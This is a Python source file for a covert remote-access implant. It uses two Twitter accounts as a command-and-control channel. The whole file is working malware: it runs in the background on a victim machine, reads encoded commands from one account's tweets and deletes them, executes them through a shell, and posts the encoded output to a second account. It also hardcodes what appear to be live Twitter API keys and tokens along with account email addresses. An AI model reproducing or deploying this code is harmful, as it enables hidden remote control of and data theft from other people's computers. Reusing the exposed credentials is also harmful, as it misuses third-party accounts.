#This must be run constantly, in the background, on the enemy computer 
#Has lots of error handling because this program can never crash or the channel will be broken

import tweepy
from newEncrypt import *
import subprocess
import os
from time import sleep
import sys

#Twitter account for this API instance: lbwbchigh@yahoo.com
#This is the Twitter page the implant checks for commands 
consumer_key = 'zLZ2NN1qemQChgVOae3QlgNtp'
consumer_secret = 'hbAZzMFdpff1sDHp50d4qt4l7QumyUfhxSybl5Smne1eTi2mEw'
access_token = '4827323871-Oig9GWZc6gkVUYK7oTkQO1O4dmoJLuCaY8vE6Dh'
access_token_secret = 'h2BMjDxt24XolArqy2vuRJYauMqKp2boNIgWUdHwlmGxD'
auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
auth.set_access_token(access_token, access_token_secret )
api = tweepy.API(auth)

#Twitter account for this API instance: krazykatphoenix@yahoo.com
#This is the Twitter page the implant posts command responses to
consumer_key = 'CEkMw02DlRrM7iFdsadhuAGWz'
consumer_secret = 'A3VVGro2sy2A0SSYLx3hD1Q4IFpa0lsobUKQ0HyAN5z6FZMf1X'
access_token = '701149655468527616-CznesGkPJEqyHGjtJTauqKPtUH9O2XJ'
access_token_secret = 'H4u8EiOe5THE8lPt51Oy4AxLyoleTpugEXIDqRbnRT5Ac'
auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
auth.set_access_token(access_token, access_token_secret )
apiTwo = tweepy.API(auth)



 


#This prints how many API calls remain for the implant to access the Twitter page containing commands
#and makes the implant sleep when only four API calls remain.
#This means the implant can check Twitter 176 times before it sleeps 	
def limit():
	data = api.rate_limit_status()
	value = str(data['resources']['statuses']['/statuses/user_timeline'])
	if (len(value) == 55):
		almost = value[-3:]
		remain= almost[:2]
		real = (int(remain) -4)
		print str(real) + " API calls remaining" 
		if( int(remain) == 4):
			print "Sleeping for 15 minutes. Manually delete tweets from Twitter pages."
			sleep(15*61)
	else:
		almost = value[-4:]
		remain= almost[:3]
		real = (int(remain) -4)
		print str(real) + " API calls remaining" 
		if( int(remain) == 4):
			print "Sleeping for 15 minutes. Manually delete tweets from Twitter pages."
			sleep(15*61)	

#This function checks Twitter for new commands to execute 
def listen():
	
	public_tweets = None
	while(not public_tweets):
		#check Twitter for new commands to execute 
		public_tweets = api.user_timeline('PhoenixKrazyKat')
		limit()
		
		if public_tweets:
			for tweet in public_tweets:
				test = str(tweet.text)			
				api.destroy_status(tweet.id)
				bytes = str.encode(test)
				type(bytes)	
				mess = decode(bytes)
				 
				#Handle 'cd' commands here
				if mess[:2] == "cd":
					try:
						os.chdir(mess[3:])
						print "Directory changed."
						result = "Directory Changed." 
						enResult = encode(result)
						apiTwo.update_status(enResult)
					except:
    							print("Unexpected error:", sys.exc_info()[0])
    							result = "Error. Invalid directory."
    							enResult = encode(result)
							apiTwo.update_status(enResult)
    							listen()
    							raise
    			#Handle all other commands here 					
				else:
					try:
						response = subprocess.check_output(mess, shell=True)
					except:
    						print("Unexpected error:", sys.exc_info()[0])
    						result = "Error. Invalid command entered."
    						enResult = encode(result)
						apiTwo.update_status(enResult)
    						listen()
    						raise
    				#Twitter API constraints and encryption padding means command responses can be no more than 47 characters 			
					if (len(response) >= 47):
						cutResp = response[:46] + '*'
						enResponse = encode(cutResp)
					else:
						newResp = response[:47]
						enResponse = encode(newResp)
					apiTwo.update_status(enResponse)
					print response
					break
			#Call 'listen()' again to keep checking for new commands, specifically the next command entered since the previous commands have been deleted 		 		
			listen()
		else: 
			#Do this if no tweets found 
			print("No tweets!")
			sleep(5)

#Main loop
if __name__ == "__main__":
	try:	
		listen() 
	except:
    		print("Unexpected error:", sys.exc_info()[0])
    		result = "Error. Invalid command entered."
    		enResult = encode(result)
		apiTwo.update_status(enResult)
    		listen()
    		raise	
	
